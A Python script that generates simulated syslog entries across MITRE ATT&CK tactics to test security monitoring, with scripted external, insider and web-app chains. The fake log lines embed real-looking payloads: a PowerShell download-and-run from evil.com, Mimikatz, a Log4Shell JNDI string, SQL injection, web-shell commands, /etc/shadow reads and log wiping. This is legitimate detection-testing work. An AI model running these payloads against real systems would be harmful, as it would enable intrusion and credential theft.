"""
Advanced Attack Simulator for AI-SOC testing.

Generates 25+ attack types across MITRE ATT&CK tactics with realistic
syslog formatting, scripted attack chains, and configurable rates.

Usage:
    python simulate_attack.py                      # Random mode (20+ types)
    python simulate_attack.py --chain external     # External compromise chain
    python simulate_attack.py --chain insider       # Insider threat chain
    python simulate_attack.py --chain webapp        # Web application attack chain
    python simulate_attack.py --chain all           # All chains sequentially
    python simulate_attack.py --rate fast           # 2-second intervals
    python simulate_attack.py --rate slow           # 30-second intervals
"""

import os
import sys
import time
import random
from typing import Callable

LOG_FILE = "mock_security.log"

# RFC 5737 documentation IP ranges
EXTERNAL_IPS = [
    "203.0.113.5", "203.0.113.42", "203.0.113.100",
    "198.51.100.23", "198.51.100.50", "198.51.100.88",
]
INTERNAL_IPS = [
    "192.168.1.10", "192.168.1.25", "192.168.1.50",
    "192.168.1.100", "10.0.0.5", "10.0.0.20",
]
USERNAMES = ["root", "admin", "ryan", "www-data", "deploy", "jenkins", "backup"]
HOSTNAMES = ["web-srv-01", "db-srv-01", "app-srv-01", "dev-ws-01"]


def _ts() -> str:
    """Generate a syslog-style timestamp."""
    return time.strftime("%b %d %H:%M:%S")


def _host() -> str:
    """Random hostname."""
    return random.choice(HOSTNAMES)


def _pid() -> int:
    """Random PID."""
    return random.randint(1000, 65535)


def _ext_ip() -> str:
    return random.choice(EXTERNAL_IPS)


def _int_ip() -> str:
    return random.choice(INTERNAL_IPS)


def _user() -> str:
    return random.choice(USERNAMES)


# ──────────────────────────────────────────────────────────
# ATTACK LIBRARY — Each function returns (log_entry, mitre_technique)
# ──────────────────────────────────────────────────────────

# RECONNAISSANCE

def attack_nmap_syn_scan() -> tuple[str, str]:
    """Nmap SYN scan detection."""
    ip = _ext_ip()
    ports = random.sample(range(1, 1025), random.randint(5, 20))
    port_list = ",".join(str(p) for p in sorted(ports[:5]))
    return (
        f"{_ts()} {_host()} kernel: [54321.00] Firewall: IN=eth0 SRC={ip} "
        f"DST={_int_ip()} PROTO=TCP DPT={port_list} SYN (possible port scan)",
        "T1046"  # Network Service Discovery
    )


def attack_dns_zone_transfer() -> tuple[str, str]:
    """DNS zone transfer attempt."""
    ip = _ext_ip()
    return (
        f"{_ts()} {_host()} named[{_pid()}]: client @0x{random.randint(0x1000,0xffff):04x} "
        f"{ip}#53: zone transfer 'example.com/AXFR/IN' denied",
        "T1590.002"  # Gather Victim Network Information: DNS
    )


def attack_snmp_enumeration() -> tuple[str, str]:
    """SNMP enumeration attempt."""
    ip = _ext_ip()
    return (
        f"{_ts()} {_host()} snmpd[{_pid()}]: Connection from UDP: [{ip}]:44321->[{_int_ip()}]:161 "
        f"with community string 'public' DENIED",
        "T1046"  # Network Service Discovery
    )


# INITIAL ACCESS

def attack_ssh_brute_force() -> tuple[str, str]:
    """SSH brute force attempt."""
    ip = _ext_ip()
    attempt = random.randint(1, 50)
    user = random.choice(["root", "admin", "test", "ubuntu"])
    return (
        f"{_ts()} {_host()} sshd[{_pid()}]: Failed password for "
        f"{'invalid user ' if user not in ['root','admin'] else ''}{user} "
        f"from {ip} port 22 ssh2 (attempt {attempt} of 50)",
        "T1110.001"  # Brute Force: Password Guessing
    )


def attack_rdp_brute_force() -> tuple[str, str]:
    """RDP brute force attempt."""
    ip = _ext_ip()
    user = random.choice(["Administrator", "admin", "user"])
    return (
        f"{_ts()} {_host()} xrdp[{_pid()}]: Login failed for user {user} "
        f"from {ip}:3389 (NLA authentication failure)",
        "T1110.001"  # Brute Force: Password Guessing
    )


def attack_phishing_click() -> tuple[str, str]:
    """Phishing link click detected in web logs."""
    user_ip = _int_ip()
    redirect = random.choice(["micros0ft-update.com", "paypa1.com", "secure-login-update.com"])
    return (
        f"{_ts()} {_host()} nginx[{_pid()}]: {user_ip} - - "
        f"'GET /redirect?url=http://{redirect}/login HTTP/1.1' 302 "
        f"(suspicious external redirect)",
        "T1566.002"  # Phishing: Spearphishing Link
    )


def attack_log4shell() -> tuple[str, str]:
    """Log4Shell exploitation attempt."""
    ip = _ext_ip()
    payload = "${jndi:ldap://" + ip + ":1389/Exploit}"
    return (
        f"{_ts()} {_host()} java[{_pid()}]: WARNING: Potential Log4Shell detected in "
        f"User-Agent header from {ip}: '{payload}'",
        "T1190"  # Exploit Public-Facing Application
    )


# EXECUTION

def attack_powershell_suspicious() -> tuple[str, str]:
    """Suspicious PowerShell command."""
    cmds = [
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
        "-EncodedCommand JABjAGwAaQBlAG4AdAA=",
        "Invoke-Mimikatz -DumpCreds",
    ]
    return (
        f"{_ts()} {_host()} powershell[{_pid()}]: ScriptBlock: {random.choice(cmds)}",
        "T1059.001"  # PowerShell
    )


def attack_reverse_shell() -> tuple[str, str]:
    """Python reverse shell detection."""
    ip = _ext_ip()
    port = random.choice([4444, 4445, 9001, 1337])
    return (
        f"{_ts()} {_host()} kernel[{_pid()}]: TCP: connection from {_int_ip()}:{port} "
        f"to {ip}:{port} (python3 -c 'import socket,subprocess,os;')",
        "T1059.006"  # Python
    )


def attack_cron_creation() -> tuple[str, str]:
    """Unauthorized cron job creation."""
    user = random.choice(["www-data", "ryan", "nobody"])
    script = random.choice(["/tmp/.hidden/collector.sh", "/dev/shm/miner.sh", "/var/tmp/beacon.py"])
    return (
        f"{_ts()} {_host()} CRON[{_pid()}]: ({user}) CMD ({script})",
        "T1053.003"  # Scheduled Task: Cron
    )


# PERSISTENCE

def attack_ssh_key_added() -> tuple[str, str]:
    """New SSH key added to authorized_keys."""
    user = _user()
    return (
        f"{_ts()} {_host()} sshd[{_pid()}]: User {user}: new SSH public key added to "
        f"/home/{user}/.ssh/authorized_keys (key fingerprint: SHA256:{random.randbytes(8).hex()})",
        "T1098.004"  # SSH Authorized Keys
    )


def attack_new_user() -> tuple[str, str]:
    """Unauthorized user account creation."""
    new_user = random.choice(["svc_backup", "admin2", "support", "mysql_admin", "temp_user"])
    uid = random.randint(1001, 1099)
    return (
        f"{_ts()} {_host()} useradd[{_pid()}]: new user: name={new_user}, "
        f"UID={uid}, GID={uid}, home=/home/{new_user}, shell=/bin/bash",
        "T1136.001"  # Create Account: Local Account
    )


def attack_systemd_persistence() -> tuple[str, str]:
    """Systemd service installed by non-root."""
    user = random.choice(["ryan", "www-data", "deploy"])
    service = random.choice(["backdoor.service", "update-check.service", "sync-daemon.service"])
    return (
        f"{_ts()} {_host()} sudo[{_pid()}]: {user} : TTY=pts/0 ; PWD=/ ; "
        f"USER=root ; COMMAND=/bin/systemctl enable /tmp/{service}",
        "T1543.002"  # Systemd Service
    )


# PRIVILEGE ESCALATION

def attack_sudo_abuse() -> tuple[str, str]:
    """sudo abuse for privilege escalation."""
    user = random.choice(["ryan", "deploy", "www-data"])
    cmd = random.choice([
        "/usr/bin/cat /etc/shadow",
        "/usr/bin/chmod +s /bin/bash",
        "/usr/bin/visudo",
        "/usr/bin/passwd root",
    ])
    return (
        f"{_ts()} {_host()} sudo[{_pid()}]: {user} : TTY=pts/0 ; "
        f"PWD=/tmp ; USER=root ; COMMAND={cmd}",
        "T1548.003"  # Sudo and Sudo Caching
    )


def attack_suid_exploitation() -> tuple[str, str]:
    """SUID binary exploitation."""
    binary = random.choice(["/usr/bin/find", "/usr/bin/vim", "/usr/bin/python3", "/usr/bin/nmap"])
    return (
        f"{_ts()} {_host()} kernel[{_pid()}]: SUID execution: {binary} executed by "
        f"uid={random.randint(1000,1099)} with euid=0 (privilege escalation suspected)",
        "T1548.001"  # Setuid and Setgid
    )


def attack_kernel_exploit() -> tuple[str, str]:
    """Kernel exploit attempt."""
    cve = random.choice(["CVE-2021-4034", "CVE-2022-0847", "CVE-2023-0386"])
    return (
        f"{_ts()} {_host()} kernel[{_pid()}]: WARNING: suspicious memory mapping "
        f"by pid {random.randint(2000,9999)}, possible exploitation of {cve} (DirtyPipe/PwnKit variant)",
        "T1068"  # Exploitation for Privilege Escalation
    )


# CREDENTIAL ACCESS

def attack_shadow_access() -> tuple[str, str]:
    """Direct /etc/shadow access."""
    user = _user()
    return (
        f"{_ts()} {_host()} sudo[{_pid()}]: {user} : TTY=pts/0 ; "
        f"PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
        "T1003.008"  # /etc/passwd and /etc/shadow
    )


def attack_mimikatz() -> tuple[str, str]:
    """Mimikatz-style credential dumping."""
    return (
        f"{_ts()} {_host()} kernel[{_pid()}]: Process {random.randint(3000,9999)} "
        f"attempted to read /proc/pid/mem of sshd (credential dumping pattern detected)",
        "T1003.007"  # Proc Filesystem
    )


def attack_kerberoasting() -> tuple[str, str]:
    """Kerberoasting attempt."""
    user = _user()
    return (
        f"{_ts()} {_host()} krb5kdc[{_pid()}]: TGS_REQ from {_int_ip()} for "
        f"HTTP/web-srv-01@DOMAIN.LOCAL: requested RC4 encryption (possible Kerberoasting by {user})",
        "T1558.003"  # Kerberoasting
    )


# LATERAL MOVEMENT

def attack_lateral_ssh() -> tuple[str, str]:
    """SSH lateral movement between internal hosts."""
    src = _int_ip()
    dst = random.choice([ip for ip in INTERNAL_IPS if ip != src])
    user = random.choice(["admin", "deploy", "www-data"])
    return (
        f"{_ts()} {_host()} sshd[{_pid()}]: Accepted password for {user} "
        f"from {src} port 22 ssh2 (lateral movement to {dst})",
        "T1021.004"  # SSH
    )


def attack_smb_lateral() -> tuple[str, str]:
    """SMB/RPC lateral movement."""
    src = _int_ip()
    targets = random.sample([ip for ip in INTERNAL_IPS if ip != src], min(3, len(INTERNAL_IPS)-1))
    return (
        f"{_ts()} {_host()} kernel[{_pid()}]: Firewall: SRC={src} "
        f"DST={','.join(targets)} PROTO=TCP DPT=445 "
        f"(SMB connections to {len(targets)} internal hosts in 30 seconds)",
        "T1021.002"  # SMB/Windows Admin Shares
    )


# EXFILTRATION

def attack_data_exfil() -> tuple[str, str]:
    """Large outbound data transfer."""
    src = _int_ip()
    dst = _ext_ip()
    size = random.randint(50000, 500000)
    return (
        f"{_ts()} {_host()} kernel[{_pid()}]: Firewall: OUT=eth0 "
        f"SRC={src} DST={dst} PROTO=TCP DPT=443 LEN={size} "
        f"(unusually large outbound transfer)",
        "T1041"  # Exfiltration Over C2 Channel
    )


def attack_dns_tunnel() -> tuple[str, str]:
    """DNS tunneling."""
    src = _int_ip()
    encoded = random.randbytes(32).hex()
    return (
        f"{_ts()} {_host()} named[{_pid()}]: client {src}#53: "
        f"query: {encoded[:16]}.tunnel.evil-domain.com IN TXT "
        f"(abnormally large DNS query — possible tunneling)",
        "T1048.003"  # Exfiltration Over Alternative Protocol: DNS
    )


def attack_data_staging() -> tuple[str, str]:
    """Data staging before exfiltration."""
    user = _user()
    archive = random.choice(["dump.tar.gz", "backup.zip", "data.7z", "export.tar.bz2"])
    source = random.choice(["/var/lib/mysql/", "/etc/", "/home/", "/var/www/"])
    return (
        f"{_ts()} {_host()} sudo[{_pid()}]: {user} : TTY=pts/0 ; "
        f"PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/{archive} {source}",
        "T1074.001"  # Data Staged: Local Data Staging
    )


# DEFENSE EVASION

def attack_log_deletion() -> tuple[str, str]:
    """Log deletion attempt."""
    user = _user()
    log_file = random.choice(["/var/log/auth.log", "/var/log/syslog", "/var/log/wtmp", "/var/log/audit/audit.log"])
    return (
        f"{_ts()} {_host()} sudo[{_pid()}]: {user} : TTY=pts/0 ; "
        f"PWD=/var/log ; USER=root ; COMMAND=/usr/bin/truncate -s 0 {log_file}",
        "T1070.002"  # Clear Linux or Mac System Logs
    )


def attack_timestomping() -> tuple[str, str]:
    """File timestomping."""
    user = _user()
    target_file = random.choice(["/tmp/backdoor.sh", "/usr/bin/svchost", "/var/tmp/beacon"])
    return (
        f"{_ts()} {_host()} sudo[{_pid()}]: {user} : TTY=pts/0 ; "
        f"PWD=/tmp ; USER=root ; COMMAND=/usr/bin/touch -t 202001010000 {target_file}",
        "T1070.006"  # Timestomp
    )


def attack_process_masquerade() -> tuple[str, str]:
    """Process masquerading (suspicious name on Linux)."""
    fake_name = random.choice(["svchost", "csrss", "lsass", "winlogon"])
    return (
        f"{_ts()} {_host()} kernel[{_pid()}]: Process '{fake_name}' (pid {random.randint(3000,9999)}) "
        f"detected — Windows process name running on Linux (possible masquerading)",
        "T1036.004"  # Masquerade Task or Service
    )


# ──────────────────────────────────────────────────────────
# ATTACK REGISTRY — severity-weighted groups
# ──────────────────────────────────────────────────────────

ATTACK_REGISTRY: dict[str, list[Callable]] = {
    "critical": [
        attack_log4shell, attack_kernel_exploit, attack_mimikatz,
        attack_data_exfil, attack_reverse_shell,
    ],
    "high": [
        attack_ssh_brute_force, attack_rdp_brute_force, attack_sudo_abuse,
        attack_suid_exploitation, attack_shadow_access, attack_new_user,
        attack_ssh_key_added, attack_systemd_persistence, attack_lateral_ssh,
        attack_smb_lateral, attack_log_deletion, attack_dns_tunnel,
    ],
    "medium": [
        attack_nmap_syn_scan, attack_dns_zone_transfer, attack_snmp_enumeration,
        attack_phishing_click, attack_powershell_suspicious, attack_cron_creation,
        attack_kerberoasting, attack_data_staging, attack_timestomping,
        attack_process_masquerade,
    ],
    "low": [
        attack_nmap_syn_scan, attack_snmp_enumeration,
    ],
}


# ──────────────────────────────────────────────────────────
# ATTACK CHAINS — scripted multi-step intrusions
# ──────────────────────────────────────────────────────────

CHAINS = {
    "external": {
        "name": "External Compromise",
        "description": "Nmap scan -> SSH brute force -> login -> privesc -> add SSH key -> exfiltrate",
        "ip": "203.0.113.5",
        "steps": [
            ("{ts} web-srv-01 kernel: [10001.00] Firewall: IN=eth0 SRC={ip} DST=192.168.1.10 PROTO=TCP DPT=22 SYN", 2),
            ("{ts} web-srv-01 kernel: [10001.50] Firewall: IN=eth0 SRC={ip} DST=192.168.1.10 PROTO=TCP DPT=80 SYN", 1),
            ("{ts} web-srv-01 kernel: [10002.00] Firewall: IN=eth0 SRC={ip} DST=192.168.1.10 PROTO=TCP DPT=443 SYN", 1),
            ("{ts} web-srv-01 kernel: [10002.50] Firewall: IN=eth0 SRC={ip} DST=192.168.1.10 PROTO=TCP DPT=3306 SYN", 1),
            ("{ts} web-srv-01 kernel: [10003.00] Firewall: IN=eth0 SRC={ip} DST=192.168.1.10 PROTO=TCP DPT=8080 SYN", 3),
            ("{ts} web-srv-01 sshd[2001]: Failed password for root from {ip} port 22 ssh2 (attempt 1 of 50)", 2),
            ("{ts} web-srv-01 sshd[2001]: Failed password for root from {ip} port 22 ssh2 (attempt 5 of 50)", 2),
            ("{ts} web-srv-01 sshd[2001]: Failed password for root from {ip} port 22 ssh2 (attempt 10 of 50)", 2),
            ("{ts} web-srv-01 sshd[2001]: Failed password for root from {ip} port 22 ssh2 (attempt 15 of 50)", 2),
            ("{ts} web-srv-01 sshd[2001]: Failed password for admin from {ip} port 22 ssh2", 2),
            ("{ts} web-srv-01 sshd[2001]: Failed password for admin from {ip} port 22 ssh2", 2),
            ("{ts} web-srv-01 sshd[2001]: Failed password for admin from {ip} port 22 ssh2", 3),
            ("{ts} web-srv-01 sshd[2001]: Accepted password for admin from {ip} port 22 ssh2", 5),
            ("{ts} web-srv-01 sudo[2010]: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow", 8),
            ("{ts} web-srv-01 sudo[2011]: admin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/chmod +s /bin/bash", 5),
            ("{ts} web-srv-01 sshd[2012]: User admin: new SSH public key added to /home/admin/.ssh/authorized_keys", 5),
            ("{ts} web-srv-01 kernel: [10500.00] Firewall: OUT=eth0 SRC=192.168.1.10 DST={ip} PROTO=TCP DPT=443 LEN=65535", 3),
            ("{ts} web-srv-01 kernel: [10510.00] Firewall: OUT=eth0 SRC=192.168.1.10 DST={ip} PROTO=TCP DPT=443 LEN=65535", 2),
        ],
    },
    "insider": {
        "name": "Insider Threat",
        "description": "Cron job -> shadow access -> new user -> systemd persistence -> data staging -> exfil",
        "ip": "192.168.1.25",
        "steps": [
            ("{ts} app-srv-01 CRON[9999]: (ryan) CMD (/tmp/.hidden/collector.sh)", 5),
            ("{ts} app-srv-01 sudo[3001]: ryan : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow", 8),
            ("{ts} app-srv-01 useradd[3002]: new user: name=svc_backup, UID=1001, GID=1001, home=/home/svc_backup, shell=/bin/bash", 10),
            ("{ts} app-srv-01 sudo[3003]: ryan : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/systemctl enable /tmp/backdoor.service", 8),
            ("{ts} app-srv-01 sudo[3004]: ryan : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/dump.tar.gz /var/lib/mysql/", 10),
            ("{ts} app-srv-01 kernel: [20000.00] Firewall: OUT=eth0 SRC={ip} DST=198.51.100.99 PROTO=TCP DPT=443 LEN=65535", 5),
        ],
    },
    "webapp": {
        "name": "Web Application Attack",
        "description": "SQLi probes -> injection -> reverse shell -> privesc -> lateral -> exfil",
        "ip": "203.0.113.42",
        "steps": [
            ("{ts} web-srv-01 nginx[4001]: {ip} - - 'GET /search?q=test HTTP/1.1' 200", 3),
            ("{ts} web-srv-01 nginx[4001]: {ip} - - 'GET /search?q=1' OR '1'='1' HTTP/1.1' 200", 3),
            ("{ts} web-srv-01 nginx[4001]: {ip} - - 'GET /search?q=1' UNION SELECT username,password FROM users-- HTTP/1.1' 200", 4),
            ("{ts} web-srv-01 nginx[4001]: {ip} - - 'POST /upload.php HTTP/1.1' 200 (uploaded: shell.php)", 5),
            ("{ts} web-srv-01 apache[4002]: {ip} - - 'GET /uploads/shell.php?cmd=id HTTP/1.1' 200", 5),
            ("{ts} web-srv-01 kernel[4003]: TCP: connection from {ip}:4444 to 192.168.1.10:4444 (reverse shell)", 8),
            ("{ts} web-srv-01 sudo[4004]: www-data : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", 10),
            ("{ts} web-srv-01 sshd[4005]: Accepted password for www-data from 192.168.1.10 port 22 ssh2 (lateral to 192.168.1.50)", 10),
            ("{ts} web-srv-01 kernel[4006]: Firewall: OUT=eth0 SRC=192.168.1.10 DST={ip} PROTO=TCP DPT=443 LEN=65535", 5),
        ],
    },
}


# ──────────────────────────────────────────────────────────
# SIMULATION ENGINE
# ──────────────────────────────────────────────────────────

def _write_log(message: str) -> None:
    """Write a log entry to the mock security log file."""
    with open(LOG_FILE, "a") as f:
        f.write(message + "\n")
    print(f"  {message}")


def generate_random_attack() -> None:
    """Generate a single random attack from the expanded library."""
    severity = random.choices(
        ["critical", "high", "medium", "low"],
        weights=[10, 25, 40, 25],
        k=1
    )[0]
    attack_fn = random.choice(ATTACK_REGISTRY[severity])
    log_entry, mitre = attack_fn()
    _write_log(log_entry)


def run_chain(chain_name: str) -> None:
    """Run a scripted attack chain simulation.

    Args:
        chain_name: One of 'external', 'insider', 'webapp'.
    """
    chain = CHAINS.get(chain_name)
    if not chain:
        print(f"[!] Unknown chain: {chain_name}")
        print(f"[*] Available: {', '.join(CHAINS.keys())}, all")
        return

    ip = chain["ip"]
    print(f"\n{'='*60}")
    print(f"[CHAIN] {chain['name']}")
    print(f"[CHAIN] {chain['description']}")
    print(f"[CHAIN] Attacker IP: {ip}")
    print(f"{'='*60}\n")

    for step_template, delay in chain["steps"]:
        msg = step_template.format(ip=ip, ts=_ts())
        _write_log(msg)
        time.sleep(delay)

    print(f"\n[CHAIN] {chain['name']} — chain complete.\n")


def main() -> None:
    """Main entry point with CLI argument handling."""
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()

    # Parse arguments
    chain_mode = None
    rate = "normal"

    args = sys.argv[1:]
    i = 0
    while i < len(args):
        if args[i] == "--chain" and i + 1 < len(args):
            chain_mode = args[i + 1]
            i += 2
        elif args[i] == "--rate" and i + 1 < len(args):
            rate = args[i + 1]
            i += 2
        else:
            i += 1

    # Attack chain mode
    if chain_mode:
        if chain_mode == "all":
            for name in CHAINS:
                run_chain(name)
                time.sleep(5)
        elif chain_mode in CHAINS:
            run_chain(chain_mode)
        else:
            print(f"[!] Unknown chain: {chain_mode}")
            print(f"[*] Available: {', '.join(CHAINS.keys())}, all")
        return

    # Random mode with expanded library
    intervals = {"fast": (1, 3), "slow": (20, 40), "normal": (5, 15)}
    lo, hi = intervals.get(rate, (5, 15))

    total_types = sum(len(v) for v in ATTACK_REGISTRY.values())
    print(f"[*] Advanced attack simulator ({total_types} attack types)")
    print(f"[*] Rate: {rate} ({lo}-{hi}s intervals). Press Ctrl+C to stop.\n")

    try:
        while True:
            generate_random_attack()
            time.sleep(random.randint(lo, hi))
    except KeyboardInterrupt:
        print("\n[*] Simulator stopped.")


if __name__ == "__main__":
    main()
